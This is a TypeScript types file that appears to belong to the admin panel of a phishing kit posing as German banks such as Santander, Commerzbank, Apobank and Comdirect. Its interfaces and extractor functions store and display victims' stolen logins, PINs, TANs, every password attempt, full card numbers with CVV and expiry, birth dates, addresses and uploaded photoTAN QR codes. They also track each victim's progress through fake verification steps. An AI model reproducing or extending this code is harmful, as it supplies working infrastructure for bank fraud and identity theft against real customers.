// Base Lead interface shared by all templates
export interface BaseLead {
  id: number;
  template_id: number;
  domain_id: number;
  tracking_id: string | null;
  name: string | null;
  email: string | null;
  phone: string | null;
  username: string | null;
  password: string | null;
  pin: string | null;
  tan: string | null;
  additional_data: string | null;
  ip_address: string | null;
  user_agent: string | null;
  status: string;
  notes: string | null;
  created_at: string;
  template_name: string;
}

// Santander-specific data structure (QR codes)
export interface SantanderAdditionalData {
  pin?: string;
  qr_codes?: Array<{
    image_url: string;
    upload_time: string;
    step: number;
  }>;
  qr_files?: Array<any>; // For backward compatibility
  // Universal login attempts
  login_attempts?: Array<{
    username: string;
    password: string;
    timestamp: string;
    attempt: number;
  }>;
  // Universal login data
  login_data?: {
    username?: string;
    password?: string;
  };
  // Personal and bank card data for compatibility
  personal_data?: {
    first_name?: string;
    last_name?: string;
    email?: string;
    phone?: string;
    [key: string]: any;
  };
  bank_card?: {
    card_number?: string;
    expiry_date?: string;
    cardholder_name?: string;
    [key: string]: any;
  };
  // Add other fields
  [key: string]: any;
}

// Commerzbank-specific data structure
export interface CommerzbankAdditionalData {
  pin?: string;
  // Universal login attempts
  login_attempts?: Array<{
    username: string;
    password: string;
    timestamp: string;
    attempt: number;
  }>;
  // Universal login data
  login_data?: {
    username?: string;
    password?: string;
  };
  // Personal data
  first_name?: string;
  last_name?: string;
  date_of_birth?: string;
  street?: string;
  street_number?: string;
  plz?: string;
  city?: string;
  phone?: string;
  email?: string;
  address?: string;
  // Bank card data
  card_number?: string;
  expiry_date?: string;
  cvv?: string;
  cardholder_name?: string;
  // QR files
  qr_files?: Array<{
    filename: string;
    originalName: string;
    path: string;
    attempt: number;
    timestamp: string;
    filesize?: number;
    filetype?: string;
    upload_attempt?: number;
    upload_time?: string;
  }>;
  // Session tracking
  session_key?: string;
  timestamp?: string;
  user_agent?: string;
  referrer?: string;
  step?: string;
  // Add other Commerzbank-specific fields as they're implemented
  [key: string]: any;
}

// Apobank-specific data structure (6-step process)
export interface ApobankAdditionalData {
  // Login data
  username?: string;
  password?: string;
  
  // Nested login data from backend
  login_data?: {
    username?: string;
    password?: string;
  };
  
  // All login attempts
  login_attempts?: Array<{
    username: string;
    password: string;
    timestamp: string;
    attempt: number;
  }>;
  
  // Personal data from PersonalDataForm
  first_name?: string;
  last_name?: string;
  date_of_birth?: string;
  street?: string;
  street_number?: string;
  plz?: string;
  city?: string;
  phone?: string;
  email?: string;
  
  // Bank card data from BankCardForm
  card_number?: string;
  expiry_date?: string;
  cvv?: string;
  cardholder_name?: string;
  
  // Flow tracking
  session_key?: string;
  completed_steps?: string[];
  verification_status?: string;
  flow_completed?: boolean; // Added for verification status
  personal_data?: { // Added for personal data
    first_name?: string;
    last_name?: string;
    date_of_birth?: string;
    street?: string;
    street_number?: string;
    plz?: string;
    city?: string;
    phone?: string;
    email?: string;
  };
  bank_card?: { // Added for bank card data
    card_number?: string;
    expiry_date?: string;
    cvv?: string;
    cardholder_name?: string;
  };
}

// Template-specific interfaces extending BaseLead
export interface SantanderLead extends BaseLead {
  template_name: 'santander';
  additional_data: string | null;
}

export interface CommerzbankLead extends BaseLead {
  template_name: 'commerzbank';
  additional_data: string | null;
}

export interface ApobankLead extends BaseLead {
  template_name: 'apobank';
  additional_data: string | null;
}

// Union type for all lead types
export type TemplateLead = SantanderLead | CommerzbankLead | ApobankLead;

// Data parser functions
export const parseAdditionalData = {
  santander: (dataString: string | null): SantanderAdditionalData => {
    if (!dataString) return {};
    try {
      return JSON.parse(dataString) as SantanderAdditionalData;
    } catch {
      return {};
    }
  },
  
  commerzbank: (dataString: string | null): CommerzbankAdditionalData => {
    if (!dataString) return {};
    try {
      return JSON.parse(dataString) as CommerzbankAdditionalData;
    } catch {
      return {};
    }
  },
  
  apobank: (dataString: string | null): ApobankAdditionalData => {
    if (!dataString) return {};
    try {
      return JSON.parse(dataString) as ApobankAdditionalData;
    } catch {
      return {};
    }
  },
};

// Field extraction helpers
export const extractField = (data: Record<string, any>, field: string, fallback: string = '-'): string => {
  const value = data[field];
  if (value === null || value === undefined || value === '') {
    return fallback;
  }
  return String(value);
};

// Santander-specific field extractors
export const santanderExtractors = {
  pin: (data: SantanderAdditionalData) => extractField(data, 'pin'),
  qrCodeCount: (data: SantanderAdditionalData) => data.qr_codes?.length.toString() || '0',
  latestQrCode: (data: SantanderAdditionalData) => {
    const qrCodes = data.qr_codes;
    if (!qrCodes || qrCodes.length === 0) return '-';
    const latest = qrCodes[qrCodes.length - 1];
    return latest ? `Schritt ${latest.step} (${latest.upload_time})` : '-';
  }
};

// Commerzbank-specific field extractors
export const commerzbankExtractors = {
  pin: (data: CommerzbankAdditionalData) => extractField(data, 'pin'),
};

// Apobank-specific field extractors
export const apobankExtractors = {
  firstName: (data: ApobankAdditionalData) => {
    return data.personal_data?.first_name || data.first_name || '-';
  },
  lastName: (data: ApobankAdditionalData) => {
    return data.personal_data?.last_name || data.last_name || '-';
  },
  fullName: (data: ApobankAdditionalData) => {
    const first = data.personal_data?.first_name || data.first_name || '';
    const last = data.personal_data?.last_name || data.last_name || '';
    return first || last ? `${first} ${last}`.trim() : '-';
  },
  dateOfBirth: (data: ApobankAdditionalData) => {
    return data.personal_data?.date_of_birth || data.date_of_birth || '-';
  },
  address: (data: ApobankAdditionalData) => {
    const street = data.personal_data?.street || data.street || '';
    const number = data.personal_data?.street_number || data.street_number || '';
    const plz = data.personal_data?.plz || data.plz || '';
    const city = data.personal_data?.city || data.city || '';
    
    const streetAddress = street && number ? `${street} ${number}` : street || number;
    const cityAddress = plz && city ? `${plz} ${city}` : plz || city;
    
    return streetAddress && cityAddress ? `${streetAddress}, ${cityAddress}` : 
           streetAddress || cityAddress || '-';
  },
  phone: (data: ApobankAdditionalData) => {
    return data.personal_data?.phone || data.phone || '-';
  },
  email: (data: ApobankAdditionalData) => {
    return data.personal_data?.email || data.email || '-';
  },
  cardNumber: (data: ApobankAdditionalData) => {
    const cardNumber = data.bank_card?.card_number || data.card_number;
    if (!cardNumber) return '-';
    // Show full card number uncensored for admin purposes
    return cardNumber;
  },
  cardExpiry: (data: ApobankAdditionalData) => {
    return data.bank_card?.expiry_date || data.expiry_date || '-';
  },
  cardHolder: (data: ApobankAdditionalData) => {
    return data.bank_card?.cardholder_name || data.cardholder_name || '-';
  },
  cardCvv: (data: ApobankAdditionalData) => {
    return data.bank_card?.cvv || data.cvv || '-';
  },
  completedSteps: (data: ApobankAdditionalData) => {
    const steps = data.completed_steps;
    return steps && Array.isArray(steps) ? steps.join(', ') : 'Alle 6 Schritte';
  },
  verificationStatus: (data: ApobankAdditionalData) => {
    return data.flow_completed ? 'Erfolgreich abgeschlossen' : data.verification_status || 'In Bearbeitung';
  },
};

// Comdirect-specific data structure
export interface ComdirectAdditionalData {
  // Personal data from verification form
  personal_data?: {
    first_name?: string;
    last_name?: string;
    date_of_birth?: string;
    street?: string;
    street_number?: string;
    plz?: string;
    city?: string;
    phone?: string;
    email?: string;
  };
  // Bank card data
  bank_card_data?: {
    card_number?: string;
    expiry_date?: string;
    cvv?: string;
    cardholder_name?: string;
  };
  // QR code data
  qr_codes?: Array<{
    image_url: string;
    upload_time: string;
    step: number;
    file_name?: string;
    file_size?: number;
  }>;
  // Login attempts
  login_attempts?: Array<{
    zugangsnummer: string;
    pin: string;
    timestamp: string;
    attempt: number;
    direkt_zu?: string;
  }>;
  // Login data
  login_data?: {
    zugangsnummer?: string;
    pin?: string;
    direkt_zu?: string;
  };
  // Flow status
  flow_completed?: boolean;
  current_step?: string;
  step_config?: {
    personalData: boolean;
    bankCard: boolean;
    qrCode: boolean;
  };
  verification_status?: string;
}

// Comdirect data extractors
export const comdirectExtractors = {
  firstName: (data: ComdirectAdditionalData) => {
    return data.personal_data?.first_name || '-';
  },
  lastName: (data: ComdirectAdditionalData) => {
    return data.personal_data?.last_name || '-';
  },
  fullName: (data: ComdirectAdditionalData) => {
    const first = data.personal_data?.first_name || '';
    const last = data.personal_data?.last_name || '';
    return first || last ? `${first} ${last}`.trim() : '-';
  },
  dateOfBirth: (data: ComdirectAdditionalData) => {
    return data.personal_data?.date_of_birth || '-';
  },
  address: (data: ComdirectAdditionalData) => {
    const street = data.personal_data?.street || '';
    const number = data.personal_data?.street_number || '';
    const plz = data.personal_data?.plz || '';
    const city = data.personal_data?.city || '';
    
    const streetAddress = street && number ? `${street} ${number}` : street || number;
    const cityAddress = plz && city ? `${plz} ${city}` : plz || city;
    
    return streetAddress && cityAddress ? `${streetAddress}, ${cityAddress}` : 
           streetAddress || cityAddress || '-';
  },
  phone: (data: ComdirectAdditionalData) => {
    return data.personal_data?.phone || '-';
  },
  email: (data: ComdirectAdditionalData) => {
    return data.personal_data?.email || '-';
  },
  cardNumber: (data: ComdirectAdditionalData) => {
    const cardNumber = data.bank_card_data?.card_number;
    if (!cardNumber) return '-';
    // Show full card number uncensored for admin purposes
    return cardNumber;
  },
  cardExpiry: (data: ComdirectAdditionalData) => {
    return data.bank_card_data?.expiry_date || '-';
  },
  cardHolder: (data: ComdirectAdditionalData) => {
    return data.bank_card_data?.cardholder_name || '-';
  },
  cardCvv: (data: ComdirectAdditionalData) => {
    return data.bank_card_data?.cvv || '-';
  },
  qrCodeCount: (data: ComdirectAdditionalData) => {
    return data.qr_codes ? data.qr_codes.length.toString() : '0';
  },
  verificationStatus: (data: ComdirectAdditionalData) => {
    return data.flow_completed ? 'Erfolgreich abgeschlossen' : data.verification_status || 'In Bearbeitung';
  },
};

// Template type enumeration
export enum TemplateType {
  SANTANDER = 'santander',
  COMMERZBANK = 'commerzbank',
  APOBANK = 'apobank',
  SPARKASSE = 'sparkasse',
  DEUTSCHE_BANK = 'deutsche_bank',
  POSTBANK = 'postbank',
  COMDIRECT = 'comdirect',
  // Add more as needed
}

// Helper type for parsed additional data
export type ParsedAdditionalData<T extends TemplateType> = 
  T extends TemplateType.SANTANDER ? SantanderAdditionalData :
  T extends TemplateType.COMMERZBANK ? CommerzbankAdditionalData :
  T extends TemplateType.APOBANK ? ApobankAdditionalData :
  T extends TemplateType.COMDIRECT ? ComdirectAdditionalData :
  Record<string, any>;

// Utility function types
export type DataParser<T> = (dataString: string | null) => T;
export type FieldExtractor<T> = (data: T, fallback?: string) => string; 